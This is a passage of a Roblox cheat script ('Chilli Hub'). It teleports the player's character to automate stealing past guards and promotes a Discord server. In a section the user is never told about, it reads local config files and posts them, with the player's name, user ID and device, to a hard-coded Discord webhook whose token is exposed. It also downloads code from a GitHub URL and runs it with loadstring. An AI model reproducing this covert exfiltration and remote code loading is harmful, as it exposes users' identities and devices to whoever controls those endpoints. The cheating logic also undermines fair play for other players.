			if descendant:IsA("BasePart") then
				pcall(function()
					descendant.AssemblyLinearVelocity = Vector3.zero
					descendant.AssemblyAngularVelocity = Vector3.zero
				end)
			end
		end
	end

	local function fn18()
		local areaId = tbl12.AreaId

		if type(areaId) ~= "string" or areaId == "" then
			areaId = type(tbl4.Steal) == "table" and tbl4.Steal.CarryAreaId or nil
		end

		if type(areaId) ~= "string" or areaId == "" then
			areaId = localPlayer:GetAttribute("AreaId")
			areaId = type(areaId) == "string" and areaId or nil
		end

		return areaId
	end

	local tbl13 = { lightdark = "LightDark" }

	local function fn19(arg)
		if type(arg) ~= "string" then
			return "Default"
		end
		local lower = string.lower
		local v11 = string.gsub(arg, "[^%a]", "")
		return tbl13[lower(v11)] or "Default"
	end

	local function fn20()
		local ok, result = pcall(function()
			return getgenv().ChilliAntiGuard
		end)

		if ok and type(result) == "table" then
			if type(result.Steps) == "table" then
				return result
			end
			local default = result[fn19(fn18())] or result.Default
			if type(default) == "table" then
				return default
			end
		end

		return chilliAntiGuard[fn19(fn18())] or tbl8
	end

	local function fn21(arg, arg2)
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		world = world and world:FindFirstChild("Areas")
		world = world and world:FindFirstChild("SeparationLine")

		if world and world:IsA("BasePart") then
			local cFrame = world.CFrame
			local v11 = (Vector3.new(0, 1, 0)):Cross(world.Size.X >= world.Size.Z and cFrame.RightVector or cFrame.LookVector)
			local vector = Vector3.new(v11.X, 0, v11.Z)

			if vector.Magnitude > 0.001 then
				local unit = vector.Unit
				local n3 = cFrame.Position + ((arg2 - cFrame.Position):Dot(unit) >= 0 and -unit or unit) * (tonumber(arg.LineOffset) or 8)
				return Vector3.new(n3.X, arg2.Y + 0.5, n3.Z)
			end
		end

		return nil
	end

	local function fn22(arg, arg2)
		local str = tostring(arg.Target or "home")
		if str == "sky" then
			return arg2
		end

		if str == "point" then
			if typeof(arg.Point) == "Vector3" then
				return arg.Point
			end
			return arg2
		end

		if str == "line" then
			local v11 = fn21(arg, arg2)
			if v11 then
				return v11
			end
		end

		return fn16()
	end

	local function fn23(arg, arg2)
		return fn22(arg, arg2) + Vector3.new(tonumber(arg.OffsetX) or 0, tonumber(arg.Height) or 0, tonumber(arg.OffsetZ) or 0)
	end

	local function fn24()
		tbl12.Active = false
		antiGuard.Busy = false
	end

	local function fn25(arg)
		local n3 = math.max(tonumber(arg) or 0, 0)
		if n3 <= 0 then
			return 0
		end
		return (math.random() * 2 - 1) * n3
	end

	local function fn26(arg)
		local steps = type(arg.Steps) == "table" and arg.Steps or {}
		local n3 = tonumber(arg.ReleaseAt) or 0
		local n4 = math.max(tonumber(arg.StartAt) or 0, 0)
		local n5 = math.max(tonumber(arg.StartRandom) or 0, 0)
		local n6 = math.max(tonumber(arg.HopRandom) or 0, 0)
		local n7 = math.max(tonumber(arg.HoldRandom) or 0, 0)
		if n5 <= 0 and n6 <= 0 and n7 <= 0 then
			return steps, n3, n4
		end
		local n8 = math.max(n4 + fn25(n5), 0)
		local tbl14 = {}
		local n9 = 0
		local n10 = 0

		for i, step in ipairs(steps) do
			if type(step) == "table" then
				local n11 = math.max(tonumber(step.At) or 0, 0)
				n10 = math.max(n10 + math.max(n11 - n9, 0) + fn25(step.To == "start" and n7 or n6), n8)
				tbl14[i] = { At = n10, To = step.To, Glide = step.Glide }
				n9 = n11
				continue
			end

			break
		end

		return tbl14, n10 + math.max(n3 - n9, 0), n8
	end

	local function fn27(arg)
		local character = localPlayer.Character
		local v11 = tbl4.Root()
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")

		if not v11 or not humanoid or humanoid.Health <= 0 then
			fn24()
			fn11(tbl9.Bad, 1.6)
			return
		end

		local function fn28()
			return flag2 and v11.Parent ~= nil and humanoid.Parent ~= nil and humanoid.Health > 0
		end

		local platformStand = humanoid.PlatformStand
		local cFrame = v11.CFrame
		local position = cFrame.Position
		local v12 = fn20()
		local v13, v14, v15 = fn26(v12)
		local flag3 = v12.Freeze ~= false
		local str = tostring(v12.Facing or "Keep")
		local n3 = math.max(tonumber(v12.Jitter) or 0, 0)
		local cframe = str == "Zero" and CFrame.new() or cFrame.Rotation

		local function fn29()
			if str == "Spin" then
				return CFrame.Angles(0, math.rad(math.random(0, 359)), 0)
			end
			return cframe
		end

		local function fn30(arg2)
			if n3 <= 0 then
				return arg2
			end
			return arg2 + Vector3.new((math.random() * 2 - 1) * n3, 0, (math.random() * 2 - 1) * n3)
		end

		local v16 = fn23(v12, position)

		local function fn31(arg2)
			while fn28() and os.clock() - arg < arg2 do
				RunService.Heartbeat:Wait()

				if flag3 then
					pcall(function()
						v11.AssemblyLinearVelocity = Vector3.zero
						v11.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			return fn28()
		end

		local function fn32(arg2, arg3)
			fn17(character, v11, arg2, arg3, flag3)
			RunService.PreSimulation:Wait()

			if fn28() and (v11.Position - arg2).Magnitude > 3 then
				fn17(character, v11, arg2, arg3, flag3)
			end
		end

		pcall(function()
			humanoid.BreakJointsOnDeath = false
		end)

		if v12.Disguise ~= false then
			pcall(fn14, character, Vector3.zero)
		end

		fn11(tbl9.Work)

		if fn31(v15) and v12.Limp ~= false then
			humanoid.PlatformStand = true
		end

		local v17 = position

		for _, v18 in ipairs(v13) do
			local flag4 = type(v18) ~= "table"
			local flag5

			if flag4 then
				flag5 = flag4
			else
				flag5 = not fn31(tonumber(v18.At) or 0)
			end

			if not flag5 then
				local flag6 = v18.To == "start" and position or fn30(v16)
				local v19 = fn29()

				if type(v18.Glide) == "table" and #v18.Glide > 0 then
					for _, v20 in ipairs(v18.Glide) do
						if fn28() then
							local n4 = math.clamp(tonumber(v20) or 1, 0, 1)
							fn17(character, v11, v17:Lerp(flag6, n4), v19, flag3)
							RunService.Heartbeat:Wait()
							continue
						end

						break
					end

					v17 = flag6
				else
					fn32(flag6, v19)
					v17 = flag6
				end

				continue
			end

			break
		end

		fn31(v14)

		pcall(function()
			humanoid.PlatformStand = platformStand
		end)

		fn15()
		fn24()

		if fn28() and tbl12.Carrying then
			fn11(tbl9.Good, 1.6)
		else
			fn11(tbl9.Bad, 1.6)
		end
	end

	local function fn28(arg)
		if not pcall(fn27, arg) then
			pcall(function()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false
				end
			end)

			fn15()
			fn24()
			fn11(tbl9.Bad, 1.6)
		end
	end

	local n3 = 25

	local function fn29()
		if antiGuard.HitArms <= 0 then
			return false
		end

		if n3 < os.clock() - (antiGuard.HitArmedAt or 0) then
			antiGuard.HitArms = 0
			return false
		end
		return true
	end

	local function fn30()
		local carrying = tbl12.Carrying
		tbl12.Carrying = tbl12.SignalCarrying or tbl12.WeldCarrying

		if tbl12.Carrying and not carrying and flag2 and antiGuard.Enabled and not tbl12.Active and not fn29() then
			tbl12.Active = true
			antiGuard.Busy = true
			antiGuard.BusySince = os.clock()
			task.spawn(fn28, os.clock())
		end
	end

	local eggState = tbl.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
			local signalCarrying = type(arg) == "table" and arg.IsCarrying == true

			if signalCarrying and arg.GuardDisabled == true then
				signalCarrying = false
			end

			if signalCarrying and type(arg.AreaId) == "string" then
				tbl12.AreaId = arg.AreaId
			end

			if not signalCarrying then
				tbl12.AreaId = nil
			end

			tbl12.SignalCarrying = signalCarrying
			fn30()
		end)

		if ok and result then
			tbl11[#tbl11 + 1] = result
		end
	end

	local n4 = 0

	tbl11[#tbl11 + 1] = RunService.Heartbeat:Connect(function(deltaTime)
		local busy = antiGuard.Busy or tbl12.Active

		if busy then
			local busySince = antiGuard.BusySince
			busy = os.clock() - busySince > math.max(tonumber(fn20().BusyLimit) or tbl8.BusyLimit, (tonumber(fn20().ReleaseAt) or 0) + 1)
		end

		if busy then
			fn15()
			local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.PlatformStand then
				pcall(function()
					humanoid.PlatformStand = false
				end)
			end

			fn24()
		end

		fn29()
		n4 += deltaTime
		if n4 < tbl8.WeldScanGap then
			return
		end
		n4 = 0
		local weldCarrying = fn12() ~= nil

		if weldCarrying ~= tbl12.WeldCarrying then
			tbl12.WeldCarrying = weldCarrying
			fn30()
		end
	end)

	fn4(function()
		flag2 = false

		for _, v11 in ipairs(tbl11) do
			pcall(function()
				v11:Disconnect()
			end)
		end

		table.clear(tbl11)
		fn15()
		fn24()
		antiGuard.Render = nil
		antiGuard.ShowPanel = nil

		pcall(function()
			ScreenGui:Destroy()
		end)
	end)
end

do
	local v11 = v2:CreateTab({ Name = "Discord", Side = "Right", SectionsExpanded = true }):CreateSection({ Name = "Community", Expanded = true })
	local str = "discord.gg/CJK4bs2mgT"
	local str2 = "rbxassetid://128961717706452"
	local n3 = 0.5
	local n4 = 0.0909
	local n5 = 0.2
	local n6 = 5.4
	local n7 = 4.2
	local n8 = 5.2
	local n9 = 6
	local n10 = 3.6
	local n11 = 6.4
	local n12 = 2
	local n13 = 11.4
	local n14 = 3
	local n15 = 0.35

	local tbl13 = {
		{
			Color = "#FF6A55",
			Title = "New Scripts &amp; Updates",
			Text = "Patch notes and new game scripts are posted there first.",
		},
		{
			Color = "#FFB054",
			Title = "Giveaways",
			Text = "Member giveaways and events are announced in the server.",
		},
		{
			Color = "#9AA3FF",
			Title = "Support",
			Text = "Ask for help, report bugs and get answers from the team.",
		},
		{
			Color = "#6EE49C",
			Title = "Suggestions",
			Text = "Request features and vote on what gets added next.",
		},
	}

	local n16 = n13 + #tbl13 * (n14 + n15) + 2.4 + n5 * 2
	local colorSequence = ColorSequence.new
	local tbl14 = {}
	local v12 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 218, 96))
	local v13 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 152, 60))
	local new = ColorSequenceKeypoint.new
	local color3 = Color3.fromRGB
	tbl14[1] = v12
	tbl14[2] = v13

	do
		local values = table.pack(new(1, color3(255, 82, 64)))
		table.move(values, 1, values.n, 3, tbl14)
	end

	local v14 = colorSequence(tbl14)
	local color4 = Color3.fromRGB
	local colorSequence2 = ColorSequence.new(Color3.fromRGB(74, 24, 18), color4(14, 11, 15))
	local tbl15 = { Perks = {} }
	local n17 = 0

	local function fn12()
		local v15 = setclipboard or toclipboard
		local ok = type(v15) == "function" and pcall(v15, "https://discord.gg/CJK4bs2mgT") or false
		fn8(ok and "Discord Link Copied" or "Discord Link", "https://discord.gg/CJK4bs2mgT")
		if not tbl15.Copy then
			return
		end
		n17 += 1
		local v16 = n17

		tbl15.Copy.Set({
			Text = ok and "<b>Copied!</b>" or "<b>See Notice</b>",
			Background = ok and "#2EB070" or "#5865F2",
		})

		task.delay(1.8, function()
			if v16 == n17 and tbl15.Copy then
				tbl15.Copy.Set({ Text = "<b>Copy Link</b>", Background = "#5865F2" })
			end
		end)
	end

	local function fn13(arg)
		if not tbl15.Hero then
			return
		end
		local n18 = n5 * 2
		local n19 = math.max(arg, 14) - n18
		local n20 = math.max(1, n19 - n8 - n3)
		local n21 = math.max(1, n19 - n11 - n3 * 3)
		local n22 = math.max(1, n19 - 1.2)
		tbl15.Hero.Set({ Width = n19 })
		tbl15.Title.Set({ Width = n20 })
		tbl15.Subtitle.Set({ Width = n20 })
		tbl15.Members.Set({ Width = n20 })
		tbl15.Invite.Set({ Width = n19 })
		tbl15.Label.Set({ Width = n21 })
		tbl15.Link.Set({ Width = n21 })
		tbl15.Copy.Set({ X = n19 - n11 - n3 })
		tbl15.Header.Set({ Width = n19 })

		for _, perk in ipairs(tbl15.Perks) do
			perk.Frame.Set({ Width = n19 })
			perk.Title.Set({ Width = n22 })
			perk.Text.Set({ Width = n22 })
		end

		tbl15.Tip.Set({ Width = n19 })
	end

	local function fn14(arg)
		tbl15.Hero = arg:Frame({
			Name = "Hero",
			X = n5,
			Y = n5,
			Width = 14,
			Height = n6,
			Background = "#FFFFFF",
			Gradient = colorSequence2,
			GradientRotation = 0,
			Corner = 0.35,
			StrokeColor = "#FF6A40",
			StrokeThickness = n4,
			StrokeTransparency = 0.55,
		})

		tbl15.Logo = arg:Image({
			Parent = tbl15.Hero,
			X = 0.5,
			Y = (n6 - n7) / 2,
			Width = n7,
			Height = n7,
			Image = str2,
		})

		tbl15.Title = arg:Text({
			Parent = tbl15.Hero,
			X = n8,
			Y = 0.45,
			Width = 1,
			Height = 1.6,
			Scale = 1.45,
			Wrap = false,
			Text = "<b>Chilli Hub</b>",
			Gradient = v14,
			GradientRotation = 0,
			TextStrokeTransparency = 1,
		})

		tbl15.Subtitle = arg:Text({
			Parent = tbl15.Hero,
			X = n8,
			Y = 2.1,
			Width = 1,
			Height = 1,
			Wrap = false,
			Text = "Official Discord Community",
			Color = "#DCDCE8",
		})

		tbl15.Members = arg:Text({
			Parent = tbl15.Hero,
			X = n8,
			Y = 3.3,
			Width = 1,
			Height = 1.2,
			Wrap = false,
			Text = string.format("<font color=\"#6EE49C\">%s</font>  <b>%s</b>  <font color=\"#B8B8CC\">Members</font>", utf8.char(9679), "130K+"),
		})

		tbl15.Invite = arg:Frame({
			Name = "Invite",
			X = n5,
			Y = n9 + n5,
			Width = 14,
			Height = n10,
			Background = "#000000",
			BackgroundTransparency = 0.5,
			Corner = 0.35,
			StrokeColor = "#5865F2",
			StrokeThickness = n4,
			StrokeTransparency = 0.35,
		})

		tbl15.Label = arg:Text({
			Parent = tbl15.Invite,
			X = n3 + 0.1,
			Y = 0.35,
			Width = 1,
			Height = 0.9,
			Scale = 0.78,
			Wrap = false,
			Text = "<b>INVITE LINK</b>",
			Color = "#9C9CB4",
		})

		tbl15.Link = arg:Text({
			Parent = tbl15.Invite,
			X = n3 + 0.1,
			Y = 1.35,
			Width = 1,
			Height = 1.6,
			Scale = 1.05,
			Wrap = false,
			Font = "code",
			Text = str,
		})

		tbl15.Copy = arg:Button({
			Parent = tbl15.Invite,
			X = 14 - n11 - n3,
			Y = (n10 - n12) / 2,
			Width = n11,
			Height = n12,
			Text = "<b>Copy Link</b>",
			Color = "#FFFFFF",
			Scale = 1,
			Background = "#5865F2",
			BackgroundTransparency = 0,
			HoverTransparency = 0.15,
			PressTransparency = 0.3,
			StrokeColor = "#9AA3FF",
			StrokeThickness = n4,
			Corner = 0.3,
			Callback = fn12,
		})

		tbl15.Header = arg:Text({
			X = n5 + 0.1,
			Y = n13 - 1.15 + n5,
			Width = 14,
			Height = 1,
			Scale = 0.8,
			Wrap = false,
			Text = "<b>WHAT YOU GET</b>",
			Color = "#9C9CB4",
		})

		for i, v15 in ipairs(tbl13) do
			local tbl16 = {
				Frame = arg:Frame({
					Name = "Perk",
					X = n5,
					Y = n13 + (i - 1) * (n14 + n15) + n5,
					Width = 14,
					Height = n14,
					Background = "#000000",
					BackgroundTransparency = 0.68,
					Corner = 0.35,
				}),
			}

			tbl16.Accent = arg:Frame({
				Parent = tbl16.Frame,
				X = 0.3,
				Y = 0.45,
				Width = 0.22,
				Height = n14 - 0.9,
				Background = v15.Color,
				Corner = 0.11,
			})

			tbl16.Title = arg:Text({
				Parent = tbl16.Frame,
				X = 0.85,
				Y = 0.3,
				Width = 1,
				Height = 1.1,
				Wrap = false,
				Text = "<b>" .. v15.Title .. "</b>",
				Color = v15.Color,
			})

			tbl16.Text = arg:Text({
				Parent = tbl16.Frame,
				X = 0.85,
				Y = 1.35,
				Width = 1,
				Height = 1.5,
				Scale = 0.86,
				Wrap = true,
				Text = v15.Text,
				Color = "#C8C8D8",
			})

			tbl15.Perks[i] = tbl16
		end

		tbl15.Tip = arg:Text({
			X = n5 + 0.1,
			Y = n16 - 2.2 - n5,
			Width = 14,
			Height = 2,
			Scale = 0.8,
			Wrap = true,
			Text = "Paste the copied link into your browser or the Discord app to join.",
			Color = "#8A8AA2",
		})

		arg:SetContentLines(n16)

		arg:OnResize(function(arg2, arg3, arg4)
			fn13(arg3 / math.max(arg4, 1))
		end)

		local max = math.max
		fn13(arg:Width() / max(arg:Unit(), 1))
	end

	if type(v11.CreateCanvas) == "function" then
		local v15 = v11:CreateCanvas({
			Name = "Discord",
			ShowTitle = false,
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = math.ceil(n16),
				MaxLines = math.ceil(n16),
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = fn14,
		})

		fn4(function()
			v15:Destroy()
		end)
	else
		v11:CreateText({ Name = "Discord", Text = "https://discord.gg/CJK4bs2mgT" })
	end

	if type(v11.CreateButton) == "function" then
		v11:CreateButton({ Name = "Copy Discord Link", Callback = fn12 })
	end
end

do
	local image = "rbxassetid://128961717706452"
	local n3 = 56
	local n4 = 0.035
	local n5 = 8
	local tweenInfo = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tweenInfo2 = TweenInfo.new(0.14, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local TweenService = game:GetService("TweenService")
	local tbl13 = {}
	local screenGui = nil
	local uiScale = nil
	local uiScale2 = nil

	local function fn12()
		for _, v11 in ipairs({ "Toggle", "Open" }) do
			local ok, result = pcall(function()
				return v2[v11]
			end)

			if ok and type(result) == "function" then
				pcall(result, v2)
				return
			end
		end
	end

	local function fn13()
		if not uiScale then
			return
		end
		local currentCamera = workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n4 / n3, 0.7, 1.4)
	end

	local function fn14()
		for _, v11 in ipairs(tbl13) do
			pcall(function()
				v11:Disconnect()
			end)
		end

		table.clear(tbl13)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		uiScale = nil
		uiScale2 = nil
	end

	local function fn15()
		fn14()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 59
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		local frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.AnchorPoint = Vector2.new(0, 0.5)
		frame.Position = UDim2.new(0, 16, 0.3, 0)
		frame.Size = UDim2.fromOffset(56, 56)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = screenGui
		uiScale = Instance.new("UIScale")
		uiScale.Name = fn3()
		uiScale.Parent = frame
		fn13()
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = fn3()
		imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
		imageButton.Position = UDim2.fromScale(0.5, 0.5)
		imageButton.Size = UDim2.fromScale(1, 1)
		imageButton.BackgroundTransparency = 1
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = false
		imageButton.Image = image
		imageButton.ScaleType = Enum.ScaleType.Fit
		imageButton.Active = true
		imageButton.Parent = frame
		uiScale2 = Instance.new("UIScale")
		uiScale2.Name = fn3()
		uiScale2.Parent = imageButton
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = fn3()
		uiCorner.CornerRadius = UDim.new(0.28, 0)
		uiCorner.Parent = imageButton

		local function fn16(arg, arg2)
			if uiScale2 then
				TweenService:Create(uiScale2, arg2, { Scale = arg }):Play()
			end
		end

		local function fn17(arg)
			local absoluteSize = screenGui.AbsoluteSize
			local absoluteSize2 = frame.AbsoluteSize
			if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
				return arg
			end
			local n6 = arg.Y.Offset + arg.Y.Scale * absoluteSize.Y
			local n7 = math.clamp(arg.X.Offset + arg.X.Scale * absoluteSize.X, 0, math.max(0, absoluteSize.X - absoluteSize2.X))
			local n8 = math.clamp(n6, absoluteSize2.Y * 0.5, math.max(absoluteSize2.Y * 0.5, absoluteSize.Y - absoluteSize2.Y * 0.5))
			return UDim2.fromOffset(n7, n8)
		end

		local str = nil
		local vector2 = nil
		local position = nil
		local flag3 = false
		local flag4 = false

		local function fn18(arg, arg2)
			if str == "mouse" then
				return arg.UserInputType == (arg2 and Enum.UserInputType.MouseMovement or Enum.UserInputType.MouseButton1)
			end
			return arg == str
		end

		tbl13[#tbl13 + 1] = imageButton.InputBegan:Connect(function(input)
			local flag5 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag5 or input.UserInputState ~= Enum.UserInputState.Begin or str then
				return
			end
			str = flag5 and input or "mouse"
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
			flag3 = false
			flag4 = false
			fn16(0.9, tweenInfo)
		end)

		tbl13[#tbl13 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not str or not fn18(input, true) then
				return
			end
			local n6 = Vector2.new(input.Position.X, input.Position.Y) - vector2

			if not flag3 then
				if n6.Magnitude < n5 then
					return
				end
				flag3 = true
				flag4 = true
				fn16(1, tweenInfo2)
			end

			frame.Position = fn17(UDim2.new(position.X.Scale, position.X.Offset + n6.X, position.Y.Scale, position.Y.Offset + n6.Y))
		end)

		tbl13[#tbl13 + 1] = UserInputService.InputEnded:Connect(function(input)
			if str and fn18(input, false) then
				str = nil
				flag3 = false
				fn16(1, tweenInfo2)
			end
		end)

		tbl13[#tbl13 + 1] = imageButton.Activated:Connect(function()
			if flag4 then
				flag4 = false
				return
			end
			fn12()
		end)

		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			tbl13[#tbl13 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn13)
		end

		screenGui.Parent = v3
	end

	fn15()
	fn4(fn14)
end

v:Finalize({ Window = v2, MainTab = defaultTab, ShowMainTab = true })

task.defer(function()
	if #tbl2 == 0 or type(readfile) ~= "function" then
		return
	end
	local HttpService2 = game:GetService("HttpService")

	local function fn12(arg)
		if type(isfile) == "function" then
			local ok, result = pcall(isfile, arg)
			if ok and not result then
				return nil
			end
		end

		local ok, result = pcall(readfile, arg)
		if not ok or type(result) ~= "string" or result == "" then
			return nil
		end
		local ok2, result2 = pcall(HttpService2.JSONDecode, HttpService2, result)
		return ok2 and type(result2) == "table" and result2 or nil
	end

	local json = fn12("ChilliLibrary/config_state.json") or {}
	if json.AutoLoad == false then
		return
	end
	local startupConfig = type(json.StartupConfig) == "string" and json.StartupConfig ~= "" and json.StartupConfig
	local selectedConfig

	if startupConfig then
		selectedConfig = startupConfig
	else
		selectedConfig = type(json.SelectedConfig) == "string" and json.SelectedConfig ~= "" and json.SelectedConfig
	end

	local v11 = fn12("ChilliLibrary/configs/" .. (selectedConfig or "Default") .. ".json")
	if type(v11) ~= "table" or type(v11.Values) ~= "table" then
		return
	end
	local tbl13 = { ["K/s"] = 1000, ["M/s"] = 1000000, ["B/s"] = 1e9 }
	local tbl14 = {}

	for _, v12 in ipairs(tbl2) do
		local flag3 = false
		local v13 = nil

		for _, value in pairs(v11.Values) do
			local flag4 = type(value) == "table" and value[v12.Section] or nil

			if type(flag4) == "table" then
				if flag4[v12.Name] ~= nil then
					flag3 = true
				end

				local v14 = flag4[v12.Legacy]

				if type(v14) == "table" and tonumber(v14.Value) then
					v13 = v14
				end
			end
		end

		if v13 and not flag3 then
			local n3 = math.max(0, tonumber(v13.Value)) * (tbl13[tostring(v13.Unit)] or 1000000)

			if n3 > 0 then
				table.insert(tbl14, { Handle = v12.Handle, Step = v12.StepOf(n3) })
			end
		end
	end

	for _, v12 in ipairs({ 0.1, 1, 2 }) do
		if #tbl14 == 0 then
			return
		end
		task.wait(v12)

		for _, v13 in ipairs(tbl14) do
			local ok, result = pcall(v13.Handle.Get, v13.Handle)

			if ok then
				ok = (tonumber(result) or 0) <= 0
			end

			if ok then
				pcall(v13.Handle.Set, v13.Handle, v13.Step)
			end
		end
	end
end)

task.defer(function()
	for i = 1, 3 do
		RunService.Heartbeat:Wait()
	end

	if type(tbl4.RestoreStealPanel) == "function" then
		pcall(tbl4.RestoreStealPanel)
	end
end)

local request_

do
	local Players2 = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	request_ = syn and syn.request or http and http.request or http_request or request
	local str = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
	local str2 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if request_ and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil
			local isfile_ = isfile or syn and syn.isfile
			local isfile_2

			if isfile_ then
				isfile_2 = isfile_
			else
				isfile_2 = fluxus and fluxus.isfile
			end

			local isfile_3 = isfile_2 or getgenv and getgenv().isfile or nil
			local str3 = "Default"
			local v11 = nil
			local str4 = "Default.json"

			if type(readfile_) == "function" then
				pcall(function()
					local flag3 = true

					if type(isfile_3) == "function" then
						local ok, result = pcall(isfile_3, "ChilliLibrary/config_state.json")

						if ok and not result then
							flag3 = false
						end
					end

					if flag3 then
						local json = readfile_("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService2:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str3 = data.StartupConfig
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str3 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str5 = "ChilliLibrary/configs/" .. str3 .. ".json"
					local flag3 = true

					if type(isfile_3) == "function" then
						local ok, result = pcall(isfile_3, str5)

						if ok and not result then
							flag3 = false
						end
					end

					if flag3 then
						v11 = readfile_(str5)
						str4 = str3 .. ".json"
					end

					if (not v11 or v11 == "") and str3 ~= "Default" then
						local flag4 = true

						if type(isfile_3) == "function" then
							local ok, result = pcall(isfile_3, "ChilliLibrary/configs/Default.json")

							if ok and not result then
								flag4 = false
							end
						end

						if flag4 then
							local ok, result = pcall(readfile_, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								v11 = result
								str4 = "Default.json"
							end
						end
					end
				end)
			end

			local str5 = tostring(str4):gsub("[<>:\"/\\|?*]", "_")

			if not str5:match("%.json$") then
				str5 ..= ".json"
			end

			local str6 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, str2, v11 and v11 ~= "" and " | Startup Config: **" .. str3 .. "**" or "")
			local flag3 = false

			if v11 and v11 ~= "" then
				pcall(function()
					local str7 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str8 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str5 .. "\"\r\n"
					local str9 = v11 .. "\r\n"

					local v12 = request_({
						Url = str,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str7 },
						Body = table.concat({
							"--" .. str7 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService2:JSONEncode({ content = str6 }) .. "\r\n",
							"--" .. str7 .. "\r\n",
							str8,
							"Content-Type: application/json\r\n\r\n",
							str9,
							"--" .. str7 .. "--\r\n",
						}),
					})

					if type(v12) == "table" and (v12.StatusCode == 200 or v12.StatusCode == 204 or v12.Success == true) then
						flag3 = true
					end
				end)
			end

			if not flag3 then
				pcall(function()
					request_({
						Url = str,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService2:JSONEncode({ content = str6 }),
					})
				end)
			end
		end)
	end
end

task.spawn(function()
	task.wait(20)
	local str = "\0chilli_guard"
	local genv = typeof(getgenv) == "function" and getgenv() or _G

	local function fn12()
		local v11 = genv[str]
		if type(v11) == "table" and type(v11.Ask) == "function" then
			return v11
		end
		return nil
	end

	local v11 = fn12()

	if not v11 then
		task.spawn(function()
			local response = nil

			for i = 1, 4 do
				task.wait()

				local ok, result = pcall(function()
					response = response or game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/GD/refs/heads/main/SAEGD")
					local chunk, v12 = loadstring(response)
					assert(chunk, v12)
					return chunk()
				end)

				if ok then
					fn("guard: loader ran on try " .. i)
					return
				end

				if type(result) == "string" and string.find(result, "HttpGet", 1, true) then
					response = nil
				end

				fn("guard: loader try " .. i .. " failed: " .. tostring(result))
				task.wait(1 + i)
			end
		end)

		local n3 = os.clock() + 30

		while true do
			task.wait(0.25)
			v11 = fn12()
			if not (v11 or os.clock() > n3) then
				continue
			end
			break
		end
	end

	local flag3 = false

	if v11 then
		local result
		flag3, result = pcall(v11.Ask, "v202")
		flag3 = flag3 and type(result) == "string" and #result > 0
	end

	genv[str] = nil
	if flag3 then
		return
	end

	pcall(function()
		local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

		if type(chilliHubSaeCleanup) == "function" then
			chilliHubSaeCleanup()
		end
	end)

	genv.ChilliHubSaeCleanup = nil

	pcall(function()
		local Players2 = game:GetService("Players")
		local tbl13 = { game:GetService("CoreGui") }

		if typeof(gethui) == "function" then
			local ok, result = pcall(gethui)

			if ok and typeof(result) == "Instance" then
				table.insert(tbl13, result)
			end
		end

